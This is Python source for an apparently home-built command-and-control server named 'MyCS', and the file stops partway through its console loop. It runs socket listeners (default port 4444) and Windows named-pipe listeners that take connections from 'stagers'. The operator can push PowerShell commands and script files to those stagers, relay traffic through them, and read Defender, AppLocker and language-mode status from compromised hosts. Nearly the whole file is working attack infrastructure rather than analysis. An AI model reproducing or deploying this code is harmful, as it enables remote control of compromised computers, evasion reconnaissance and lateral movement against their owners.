import socket
import struct
import threading
import queue
import uuid 
import os
import time

import win32pipe, win32file, pywintypes

#from os.path import isfile, join

import readline
readline.parse_and_bind("tab: complete")

class VolcabCompleter:
    def __init__(self,volcab):
        self.volcab = volcab

    def complete(self,text,state):
        results =  [x for x in self.volcab if x.startswith(text)] + [None]
        return results[state]

def setautocomplete(words):
    completer = VolcabCompleter(words)
    readline.set_completer(completer.complete)

def removecomplete():
    readline.set_completer()

class myconstant():
    def __init__(self):

        self.TAG_MYCS = "[MYCS]"
        self.TAG_LISTENER = "[Listener]"
        #self.TAG_STAGER = "[Stager]"
        self.TAG_INTE_STAGER = "[Interact]"
        self.TAG_PIPE_LISTENER = "[Pipe Listener]"
        self.TAG_PIPE_INTE_STAGER = "[Pipe Interact]"


        self.CMD_USELISTENER = "uselistener"
        #self.CMD_USESTAGER = "userstager"
        self.CMD_INTERACTSTAGER = "stager"
        self.CMD_PIPE_INTERACTSTAGER = "pstager"
        self.CMD_USEPIPELISTENER = "usepipelistener"
        self.CMD_HELP = "help"
        self.CMD_EXIT = "exit"
        self.CMD_AUTOLIST = [self.CMD_USEPIPELISTENER,self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT,self.CMD_PIPE_INTERACTSTAGER]

        self.CMD_BACK = "back"
        self.CMD_LISTENER_GETINFO = "info"
        self.CMD_LISTENER_SETHOSTNAME = "sethost"
        self.CMD_LISTENER_SETPORT = "setport"
        self.CMD_LISTENER_START = "start"
        self.CMD_LISTENER_LIST = "list"
        self.CMD_LISTENER_STOP = "stop"
        self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
                                    self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]

        self.CMD_STAGER_GET_LIST = "list"
        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_STAGER_GET_INTO = "into"
        self.CMD_STAGER_GET_HISTORY = "history"
        self.CMD_STAGER_LOAD_PS = "psload"
        self.CMD_STAGER_CON = "connect"
        self.CMD_STAGER_PFW = "pfw"
        #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,
                                        self.CMD_STAGER_GET_HISTORY,self.CMD_HELP,self.CMD_STAGER_LOAD_PS,self.CMD_STAGER_CON,self.CMD_STAGER_PFW]

        self.CMD_PIPE_LISTENER_GETINFO = "info"
        self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
        self.CMD_PIPE_LISTENER_START = "start"
        self.CMD_PIPE_LISTENER_LIST = "list"
        self.CMD_PIPE_LISTENER_STOP = "stop"
        self.CMD_PIPE_LISTENER_AUTOLIST = [self.CMD_PIPE_LISTENER_GETINFO,self.CMD_PIPE_LISTENER_SETPIPENAME,self.CMD_PIPE_LISTENER_START,
                                            self.CMD_PIPE_LISTENER_LIST,self.CMD_PIPE_LISTENER_STOP,self.CMD_BACK]
        
        self.CMD_PIPE_STAGER_GET_LIST = "list"
        self.CMD_PIPE_STAGER_GET_RUNNING_LIST = "rlist"
        self.CMD_PIPE_STAGER_GET_INTO = "into"
        self.CMD_PIPE_STAGER_GET_HISTORY = "history"
        self.CMD_PIPE_STAGER_CON = "connect"
        self.CMD_PIPE_SAGER_AUTOLIST = [self.CMD_PIPE_STAGER_GET_LIST,self.CMD_PIPE_STAGER_GET_INTO,self.CMD_PIPE_STAGER_GET_HISTORY,
                                            self.CMD_BACK,self.CMD_PIPE_STAGER_GET_RUNNING_LIST,self.CMD_PIPE_STAGER_CON]
        #self.CMD_PIPE_STAGER_LOAD_PS = "psload"
        #self.CMD_PIPE_STAGER_CON = "connect" 


class myconstant_networking(): #applicaiton layer tag
    def __init__(self):
        self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
        self.PIPE_CONNECTED = "PIPE_CONNECTED"
        self.FW_NOTREADY = "FW_NOTREADY"
        self.FW_SUCCESS = "FW_SUCCESS" #for remote startup
        self.FW_LOCAL_SUCCESS = "FW_LOCAL_SUCCESS" #for local startup
        self.FW_LOCAL_ERROR = "FW_LOCAL_ERROR" #for local startup


class mybuildin_cmd():
    def __init__(self):
        self.IF64BIT = "[Environment]::Is64BitProcess"
        self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
        self.GETDEFENDER = "Get-MpComputerStatus"
        self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
        self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"


class ps_loader():
    def __init__(self):
        self.DBPATH = "PSDB\\"
        self.psfiles = [f for f in os.listdir(self.DBPATH) if os.path.isfile(os.path.join(self.DBPATH, f))]

    def load_ps(self,filename):
        if filename not in self.psfiles:
            print("No available ...")
            return

        with open(self.DBPATH + filename,mode='r') as f:
            all_of_it = f.read()
            return all_of_it



# socket is assume connected
class mypipe_handler():
    def __init__(self,mypipe):
        self.__mypipe = mypipe
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"

    def msf_encode(self,msg):
        return msg #no encode for now ...
        #return self.__msg_tag_st + msg + self.__msg_tag_ed


    def get_nextmsg(self):
        while True:
            try:
                resp = win32file.ReadFile(self.__mypipe, 1024)
                break
            except Exception as e:
                if e.args[0] == 232:
                    pass
                else:
                    raise e
        return resp[1].decode("utf8", "ignore")


# socket is assume connected
class mysocket_handler():
    def __init__(self,in_socket):
        self.__mysocket = in_socket
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"
        self.__mysocket.settimeout(5)

    def msf_encode(self,msg):
        return self.__msg_tag_st + msg + self.__msg_tag_ed


    def get_nextmsg(self):

        while True:
            # if msg buf is enough
            if self.__msg_tag_st in self.__msg_buf and self.__msg_tag_ed in self.__msg_buf:
                #get start tag
                t_startmsg = self.__msg_buf.find(self.__msg_tag_st)
                t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
                # msg is from startmsg + len(tag) to endmsg
                r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
                #print("[DEBUG] r_msg: {}".format(r_msg))
                # remove sub string from buf + return
                self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
                return r_msg
            else:
                # get more message
                try: 
                    t_indata = self.__mysocket.recv(1024)
                    self.__msg_buf = self.__msg_buf + t_indata.decode("utf8", "ignore")
                except socket.timeout:
                    pass
    def get_native_all(self):
        while True:
            try:
                print("[DEBUG] get_native_all, trying to read something")
                t_indata = self.__mysocket.recv(1024)
                new_msg = t_indata.decode("utf8", "ignore")
                if len(new_msg) == 0: #got FIN
                    return self.__msg_buf
                self.__msg_buf = self.__msg_buf + new_msg
            except socket.timeout: #assmue no connection error
                return self.__msg_buf


class myserver():

    def __init__(self):
        self.__mysocket_list = dict()
        self.__mydata_list = dict() #Que to runner
        self.__myaddr_list = dict() #this is port + ip
        self.__mymsg_list = dict()
        self.__myuuid_list = list()
        self.__mystart_list = dict() #bool
        self.__myfwdata_list_tomaster = dict()
        self.__myfwdata_list_toslave = dict()
        self.__myfwdata_list_torh = dict()
        self.__myfwdata_list_fromrh = dict()


        self.__mylistener_start_list = dict() #bool
        self.__mylistener_hostname_list = dict()
        self.__mylistener_port_list = dict()
        self.__mylistener_socket_list = dict()
        self.__mylistener_uuid_list = list()

        self.__hostname = "192.168.182.131"
        self.__port = 4444

        self.__pipename = "namedpipeshell"

        self.__mypipelistener_start_list = dict() #bool
        self.__mypipelistener_pipename_list = dict()
        self.__mypipelistener_pipe_list = dict()
        self.__mypipelistener_uuid_list = list()
        
        self.__mypipe_myhandle_list = dict()
        self.__mypipe_mydata_list = dict() #Que to runner
        self.__mypipe_mypipename_list = dict()
        self.__mypipe_mymsg_list = dict()
        self.__mypipe_myuuid_list = list()
        self.__mypipe_mystart_list = dict() #bool

    def get_resource_handler_result(self,myuuid):
        t_net_constant = myconstant_networking()
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
        local_item_que_torh = self.__myfwdata_list_torh[myuuid]

        while True:
            try:
                msg_item = local_item_que_fromrh.get(block=True, timeout=5)
                break
            except queue.Empty:
                print("[DEBUG] get_resource_handler_result Local Job Que for {} is empty".format(myuuid))
                continue
        
        return msg_item


    def start_resource_handler(self,myuuid,conhost,conport): #its possible to have its own uuid
        t_net_constant = myconstant_networking()
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
        local_item_que_torh = self.__myfwdata_list_torh[myuuid]

        print("[Local] This is the resousce handler for my uuid: {}".format(myuuid))
        # try connect to the addr send tag on success or fail
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((conhost,conport))
            local_item_que_fromrh.put(t_net_constant.FW_LOCAL_SUCCESS)
        except Exception as e:
            print("[Local] Error connecting to client: {}...".format(str(e)))
            local_item_que_fromrh.put(t_net_constant.FW_LOCAL_ERROR)
        
        #try to get cmd first then send resouces
        while True:
            while True:
                try:
                    msg_item = local_item_que_torh.get(block=True, timeout=5)
                    break
                except queue.Empty:
                    print("[DEBUG] start_resource_handler Local Job Que for {} is empty".format(myuuid))
                    continue
            print("[DEBUG] start_resource_handler" + msg_item)
            #encode write to
            encode_cmd = msg_item.encode("utf8", "ignore")
            send_result = client.send(encode_cmd)
            print("[DEBUG] trying to get reponse from local server ...")
            #get response if any, better put a timeout here
            t_mysocket_handler = mysocket_handler(client)
            #to_send = client.recv(1024)
            #decode_msg = to_send.decode("utf8", "ignore")
            decode_msg = t_mysocket_handler.get_native_all()
            print("[DEBUG] start_resource_handler" + decode_msg)

            local_item_que_fromrh.put(decode_msg)
            print("[DEBUG] start_resource_handler Put success ... ")


    def start_slave_worker(self,myuuid):
        #single target for now
        t_net_constant = myconstant_networking()
        local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
        local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
        local_item_que_torh = self.__myfwdata_list_torh[myuuid]

        print("[Stager] This is the local worker for my uuid: {}".format(myuuid))
        
        while True:
            #put command on main que and wait for response
            self.create_command(myuuid,"fwq","dummy")
            while True:
                try:
                    msg_item = local_item_que_toslave.get(block=True, timeout=5)
                    break
                except queue.Empty:
                    print("[DEBUG] start_slave_worker Local Job Que (toslave) for {} is empty".format(myuuid))
                    continue
            
            if msg_item != t_net_constant.FW_NOTREADY:
                print("[Stager] Real data")
                local_item_que_torh.put(msg_item)
            
                # assume there always reponse
                while True:
                    try:
                        msg_item = local_item_que_fromrh.get(block=True, timeout=5)
                        break
                    except queue.Empty:
                        print("[DEBUG] start_slave_worker Local Job Que (fromrh) for {} is empty".format(myuuid))
                        continue
                
                print("[DEBUG] start_slave_worker" + msg_item)
                local_item_que_tomaster.put(msg_item)
            else:
                local_item_que_tomaster.put(t_net_constant.FW_NOTREADY)
            time.sleep(5)
        

    def start_worker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mydata_list[myuuid]
            mysocket = self.__mysocket_list[myuuid]
            myhistory = self.__mymsg_list[myuuid]
            # make a handler class
            t_mysockethandler = mysocket_handler(mysocket)
            

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            print("[DEBUG] Job item {}".format(cmd_struct_to_send))

            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mysockethandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                send_result = mysocket.send(encode_tag)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mysockethandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                send_result = mysocket.send(encode_cmd)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                #if fwq
                if cmd_struct_to_send[0] == "fwq":
                    print("[DEBUG] start_worker, I am working for fwq")
                    #get the next message check tag
                    recv_result = t_mysockethandler.get_nextmsg()
                    print("[DEBUG] start_worker, get_nextmsg is {}".format(recv_result))
                    #push command to local worker and wait for response
                    local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
                    local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
                    print("[DEBUG] start_worker, Trying to put into que")
                    local_item_que_toslave.put(recv_result)
                    print("[DEBUG] start_worker, Puted into ..")
                    while True:
                        try:
                            msg_item = local_item_que_tomaster.get(block=True, timeout=5)
                            break
                        except queue.Empty:
                            print("[DEBUG] start_worker, Local Job Que for {} is empty".format(myuuid))
                            continue
                    
                    print("[DEBUG] start_worker, Got item back")
                    if msg_item != t_net_constant.FW_NOTREADY: #send it back to ack the que get
                        #send it to client
                        encode_cmd = t_mysockethandler.msf_encode(msg_item).encode("utf8", "ignore")
                        send_result = mysocket.send(encode_cmd)
                        print("[DEBUG] start_worker, real data sent")
                    else:
                        print("[DEBUG] start_worker, FW_NOTREADY")
                    #else, no need to send back
                    continue
                
                if cmd_struct_to_send[0] == "fw": #fw init
                    #get ack, no send
                    recv_result = t_mysockethandler.get_nextmsg()
                    myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                    continue

                # try get cmd result if any
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mysockethandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("utf8", "ignore")
                send_result = mysocket.send(encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                myhistory.append("Exception: " + str(e))
                mysocket.shutdown(socket.SHUT_RDWR)
                mysocket.close()
                #remove from worker list
                self.__mydata_list.pop(myuuid, None)
                self.__mysocket_list.pop(myuuid, None)
                self.__myaddr_list.pop(myuuid, None)
                self.__mystart_list[myuuid] = False
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    def start_pipworker(self,myuuid):
        t_net_constant = myconstant_networking()
        print("[Stager] This is the pipe worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mypipe_mydata_list[myuuid]
            mypipe = self.__mypipe_myhandle_list[myuuid]
            myhistory = self.__mypipe_mymsg_list[myuuid]

            t_mypipehandler = mypipe_handler(mypipe)

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_tag)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                # try get cmd result if any
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mypipehandler.msf_encode(t_net_constant.PSRUN_SUCCESS).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                print("Exception: " + str(e))
                myhistory.append("Exception: " + str(e))
                #remove from worker list
                self.__mypipe_mydata_list.pop(myuuid, None)
                self.__mypipe_mypipename_list.pop(myuuid, None)
                self.__mypipe_mystart_list[myuuid] = False
                win32file.CloseHandle(self.__mypipe_myhandle_list[myuuid])
                self.__mypipe_myhandle_list.pop(myuuid, None)
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    
    def start_client(self,conhost,conport):
        print("Trying to connect to Host: {} and Port: {}".format(conhost,conport))
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((conhost,conport))
        except Exception as e:
            print("Error connecting to client: {}...".format(str(e)))
            return
        
        #get uuid and normal setup
        print("[Client] Connected to", conhost)
        #get uuid
        myuuid = uuid.uuid4().hex[:6].upper()
        #push socket into dict
        self.__mysocket_list[myuuid] = client
        #push addr into dict
        self.__myaddr_list[myuuid] = (conhost,conport) #may or may not the same format 
        #create fifo
        self.__mydata_list[myuuid] = queue.Queue()
        #create history
        self.__mymsg_list[myuuid] = list()
        #push uuid
        self.__myuuid_list.append(myuuid)
        #set start
        self.__mystart_list[myuuid] = True
        print("[Client] myuuid is {}".format(myuuid))
        threading.Thread(target=self.start_worker,args=(myuuid,)).start()

    def start_pipe_client(self,conhost,pipename):
        t_net_constant = myconstant_networking()
        print("Trying to connect to {}".format(r'\\'+ conhost + r'\pipe\\' + pipename))

        try:
            handle = win32file.CreateFile(r'\\'+ conhost + r'\pipe\\' + pipename, win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None, win32file.OPEN_EXISTING, 0, None)
            win32pipe.SetNamedPipeHandleState(handle, win32pipe.PIPE_READMODE_MESSAGE, None, None)
            resp = win32file.ReadFile(handle, 1024)
        except Exception as e:
            print("Error connecting to client: {}...".format(str(e)))
            return
        
        if resp[1].decode("utf8", "ignore") == t_net_constant.PIPE_CONNECTED:
            print("[Client] Connected to", conhost)
            
            #have everything normally 
            myuuid = uuid.uuid4().hex[:6].upper() #stager
            #create fifo
            self.__mypipe_mydata_list[myuuid] = queue.Queue()
            #create history
            self.__mypipe_mymsg_list[myuuid] = list()
            #push uuid
            self.__mypipe_myuuid_list.append(myuuid)
            #set start
            self.__mypipe_mystart_list[myuuid] = True
            #pipe name
            self.__mypipe_mypipename_list[myuuid] = pipename
            #push pipe handle
            self.__mypipe_myhandle_list[myuuid] = handle
            
            print("[Client] myuuid is {}".format(myuuid))
            threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
        else:
            print("ACK failed ...")




    def start_listener(self):
        print("Starting listener on Hostname: {} and Port: {}".format(self.__hostname,self.__port))
        #get uuid
        listeneruuid = uuid.uuid4().hex[:6].upper()
        self.__mylistener_start_list[listeneruuid] = True
        self.__mylistener_hostname_list[listeneruuid] = self.__hostname
        self.__mylistener_port_list[listeneruuid] = self.__port
        self.__mylistener_uuid_list.append(listeneruuid)

        self.__mylistener_socket_list[listeneruuid] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__mylistener_socket_list[listeneruuid].bind((self.__hostname, self.__port))
        self.__mylistener_socket_list[listeneruuid].settimeout(5)
        self.__mylistener_socket_list[listeneruuid].listen()
        
        while self.__mylistener_start_list[listeneruuid]:
            try:
                #print("[DEBUG] Waiting for new connection ...")
                conn, addr = self.__mylistener_socket_list[listeneruuid].accept()
                print("[Listener] Connected by", addr)
                #get uuid
                myuuid = uuid.uuid4().hex[:6].upper()
                #push socket into dict
                self.__mysocket_list[myuuid] = conn
                #push addr into dict
                self.__myaddr_list[myuuid] = addr
                #create fifo
                self.__mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mymsg_list[myuuid] = list()
                #push uuid
                self.__myuuid_list.append(myuuid)
                #set start
                self.__mystart_list[myuuid] = True
                #init pfw
                self.__myfwdata_list_toslave[myuuid] = queue.Queue()
                self.__myfwdata_list_tomaster[myuuid] = queue.Queue()
                self.__myfwdata_list_torh[myuuid] = queue.Queue()
                self.__myfwdata_list_fromrh[myuuid] = queue.Queue()

                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                
            except socket.timeout:
                pass
        
        # our of while loop
        self.__mylistener_socket_list[listeneruuid].close()
        self.__mylistener_start_list.pop(listeneruuid, None)
        self.__mylistener_hostname_list.pop(listeneruuid, None)
        self.__mylistener_port_list.pop(listeneruuid, None)
        self.__mylistener_socket_list.pop(listeneruuid, None)
        self.__mylistener_uuid_list.remove(listeneruuid)
        print("[Listener] {} is stoped ...".format(listeneruuid))


    def start_pipe_listener(self):
        print("[Listener] pipe server started on namepipe {}".format(self.__pipename))
        mypipeuuid = uuid.uuid4().hex[:6].upper() #listener
        pipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
        self.__mypipelistener_pipe_list[mypipeuuid] = pipe
        self.__mypipelistener_pipename_list[mypipeuuid] = self.__pipename
        self.__mypipelistener_uuid_list.append(mypipeuuid)
        self.__mypipelistener_start_list[mypipeuuid] = True
        
        #print("[Listener] waiting for client")
        while self.__mypipelistener_start_list[mypipeuuid]:
            
            try:
                win32pipe.ConnectNamedPipe(self.__mypipelistener_pipe_list[mypipeuuid], None)
                print("[Listener] got client")

                myuuid = uuid.uuid4().hex[:6].upper() #stager
                #create fifo
                self.__mypipe_mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mypipe_mymsg_list[myuuid] = list()
                #push uuid
                self.__mypipe_myuuid_list.append(myuuid)
                #set start
                self.__mypipe_mystart_list[myuuid] = True
                #pipe name
                self.__mypipe_mypipename_list[myuuid] =self.__mypipelistener_pipename_list[mypipeuuid]
                #push pipe handle
                self.__mypipe_myhandle_list[myuuid] = self.__mypipelistener_pipe_list[mypipeuuid]
                
                
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
                
                while (self.__mypipe_mystart_list[myuuid]):
                    time.sleep(5)
                
                #renew handle
                newpipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__mypipelistener_pipename_list[mypipeuuid], win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
                self.__mypipelistener_pipe_list[mypipeuuid] = newpipe
                
            except Exception as e:
                if (e.args[0] == 536): #notstarted or busy
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                elif (e.args[0] == 231):
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                else:
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                time.sleep(5)

        #end of while loop
        self.__mypipelistener_pipe_list.pop(mypipeuuid, None)
        self.__mypipelistener_pipename_list.pop(mypipeuuid, None)
        self.__mypipelistener_start_list.pop(mypipeuuid, None)
        self.__mypipelistener_uuid_list.remove(mypipeuuid)
        print("[Listener] {} is stoped ...".format(mypipeuuid))


    def create_command(self,stager,tag,command):
        self.__mydata_list[stager].put([tag,command])
    
    def create_pipe_command(self,stager,tag,command):
        self.__mypipe_mydata_list[stager].put([tag,command])
    
    def stop_listener(self,listener):
        self.__mylistener_start_list[listener] = False

    def stop_pipe_listener(self,listener):
        self.__mypipelistener_start_list[listener] = False

    def print_info(self):
        print("++++++++++++++++++++++++Listener Info++++++++++++++++++++++++")
        print("Listener Type: socket")
        print("Hostname: {}".format(self.__hostname))
        print("Port Number: {}".format(self.__port))
    
    def print_pipe_info(self):
        print("+++++++++++++++++++++Pipe Listener Info++++++++++++++++++++++")
        print("Listener Type: pipe")
        print("Pipe Name: {}".format(self.__pipename))

    
    def print_stager(self):
        print("List of avaliable stager: {}".format(self.__myuuid_list))
    
    def print_pipe_stager(self):
        print("List of avaliable pipe stager: {}".format(self.__mypipe_myuuid_list))

    
    def print_listener(self):
        print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))
    
    def print_pipe_listener(self):
        print("List of avaliable pipe listener: {}".format(self.__mypipelistener_uuid_list))

    def get_stager(self):
        return self.__myuuid_list
    
    def get_pipe_stager(self):
        return self.__mypipe_myuuid_list

    def get_running_stager(self):
        return [a for a in self.__myuuid_list if self.__mystart_list[a]]
    def get_running_pipe_stager(self):
        return [a for a in self.__mypipe_myuuid_list if self.__mypipe_mystart_list[a]]

    def get_listener(self):
        return self.__mylistener_uuid_list
    
    def get_pipe_listener(self):
        return self.__mypipelistener_uuid_list

    def print_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_stager()))
    def print_pipe_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_pipe_stager()))

    def get_history(self):
        return self.__mymsg_list
    
    def get_pipe_history(self):
        return self.__mypipe_mymsg_list

    def set_hostname(self,hostname):
        assert(type(hostname) is str)
        self.__hostname = hostname

    def set_portnumber(self,port):
        assert(type(port) is int)
        self.__port = port
    
    def set_pipename(self,pipename):
        assert(type(pipename) is str)
        self.__pipename = pipename


class mymainclass():

    def __init__(self):
        self.__t_myconstant = myconstant()
        self.__t_myserver = myserver()
        self.__t_net_constant = myconstant_networking()

    def __cmd_list_main(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
        print(self.__t_myconstant.CMD_USEPIPELISTENER + ": Go to pipe listener setting")
        print(self.__t_myconstant.CMD_PIPE_INTERACTSTAGER + ": Interact with pipe stager")
        print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_listener(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_LISTENER_GETINFO + ": Print info of current listener setting")
        print(self.__t_myconstant.CMD_LISTENER_SETHOSTNAME + ": Set hostname")
        print(self.__t_myconstant.CMD_LISTENER_SETPORT + ": Set port number")
        print(self.__t_myconstant.CMD_LISTENER_LIST + ": Get a list of running listener")
        print(self.__t_myconstant.CMD_LISTENER_START + ": Start Listener using info")
        print(self.__t_myconstant.CMD_LISTENER_STOP + ": Stop a listener")
        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
        print(self.__t_myconstant.CMD_BACK + ": Go back to main menu")
        print("+++++++++++++++++++++++++++++++++++\n")

    def __cmd_list_stager(self):
        print("\n+++++++++++++++++++++++++++++++++++")
        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
        print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
        print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
        print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
        print("+++++++++++++++++++++++++++++++++++\n")


    def main(self):
        
        #init
        cmd_tag = self.__t_myconstant.TAG_MYCS

        print("Hello To MyCS ...")
        
        self.__cmd_list_main()
        

        to_exit = False
        while (not to_exit):

            if cmd_tag == self.__t_myconstant.TAG_MYCS:
                setautocomplete(self.__t_myconstant.CMD_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_STAGER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_LISTENER_AUTOLIST)
            if cmd_tag == self.__t_myconstant.TAG_PIPE_INTE_STAGER:
                setautocomplete(self.__t_myconstant.CMD_PIPE_SAGER_AUTOLIST)
            

            user_input = input(cmd_tag + "> ")
            command_id = user_input
            
            if cmd_tag == self.__t_myconstant.TAG_MYCS: #Main menu
                
                # menu switch
                if command_id == self.__t_myconstant.CMD_USELISTENER:
                    cmd_tag = self.__t_myconstant.TAG_LISTENER
                    continue

